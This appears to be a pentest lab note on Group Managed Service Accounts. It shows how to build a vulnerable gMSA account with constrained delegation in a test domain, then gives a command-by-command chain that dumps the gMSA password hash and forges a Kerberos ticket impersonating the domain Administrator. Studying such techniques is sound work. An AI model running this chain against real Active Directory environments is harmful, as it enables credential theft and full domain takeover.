# Group Managed Service Accounts \(GMSA\)

###  GMSA Account & Constrained Delegation

#### Build

```text
Add-KdsRootKey –EffectiveTime ((get-date).addhours(-10)) 
New-ADServiceAccount -Name sql_svc -DNSHostName vulnlab.local -PrincipalsAllowedToRetrieveManaged "gmsa-readers"
Set-ADServiceAccount -Identity sql_svc -TrustedForDelegation $true
Set-ADAccountControl -Identity sql_svc$ -TrustedForDelegation $false -TrustedToAuthForDelegation $true
```

Then, in the AD Users & Computers GUI, set msDS-AllowedToDelegateTo attribute of sql\_svc to "DNS/dc.vulnlab.local" \(or whatever SPN you want to allow constrained delegation to\).

In order to read the GMSA password later you have to enable LDAPS \(Add Role "Active Directory Certificate Services" and restart\).

#### Exploit

Read GMSA password & use it to exploit the constrained delegation.

```text
python3 gMSADumper.py -u <user in gmsa-readers group> -p '' -d vulnlab.local

getST.py vulnlab.local/sql_svc$ -hashes :<hash>-spn DNS/dc.vulnlab.local -impersonate Administrator -dc-ip dc.vulnlab.local

export 'KRB5CCNAME=Administrator.ccache'

smbclient.py Administrator@dc.vulnlab.local -k -no-pass
```

Sometimes you will have to sync your local time to either a targets webserver, or just google.

```text
sudo date -s "$(curl -sI google.com| grep -i '^date:'|cut -d' ' -f2-)"
```

### Resources

* [https://en.hackndo.com/constrained-unconstrained-delegation/](https://en.hackndo.com/constrained-unconstrained-delegation/)
* [https://docs.microsoft.com/en-us/windows-server/security/group-managed-service-accounts/configure-kerberos-delegation-group-managed-service-accounts](https://docs.microsoft.com/en-us/windows-server/security/group-managed-service-accounts/configure-kerberos-delegation-group-managed-service-accounts)



